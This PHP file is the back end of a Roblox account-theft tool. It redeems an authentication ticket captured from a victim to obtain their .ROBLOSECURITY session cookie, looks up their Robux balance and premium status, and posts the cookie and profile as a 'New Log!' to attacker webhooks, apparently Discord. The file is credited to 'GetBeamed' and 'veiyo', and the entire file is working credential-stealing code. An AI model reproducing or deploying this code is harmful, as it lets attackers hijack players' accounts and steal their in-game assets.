<?php
    require("config.php");
    header("Access-Control-Allow-Origin: *");

    if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
        die();
    }

    $ticket = $_GET["t"];
    if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
        die();
    }

    // request for auth2cookie
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
                "{\"authenticationTicket\": \"$ticket\"}");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Referer: https://www.roblox.com/games/1818/--',
        'Origin: https://www.roblox.com',
        'User-Agent: Roblox/WinInet',
        'RBXAuthenticationNegotiation: 1'
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    // attempt to find set-cookie header for .ROBLOSECURITY
    $cookie = null;

    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        
        if (account_filter($profile)) {
            $hookObject = json_encode([
                "content" => "@everyone | New Log!",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("#e40b12"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "GetBeamed",
                             "url" => "https://discord.gg/6K5w7xxXD5"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:794268988527607840> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:654458613510701076> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rolimons:792137599157665832> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:685783105692368904> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:730164927872106595> Is Premium?",
                                "value" => $profile["IsPremium"],
                                "inline" => True
                            ]
                       ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("#e40b12"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Tool by veiyo#0002",
                             "icon_url" => "https://cdn.discordapp.com/icons/803164809209315339/f1f9280d2aaac459acad2e82c2e339f6.jpg?width=42",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                                "value" => "```" . $cookie . "```"
                             ]
                        ]
                    ]
                ]

            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $rolimonswebpage,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $webhook,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
        }
    }
?>
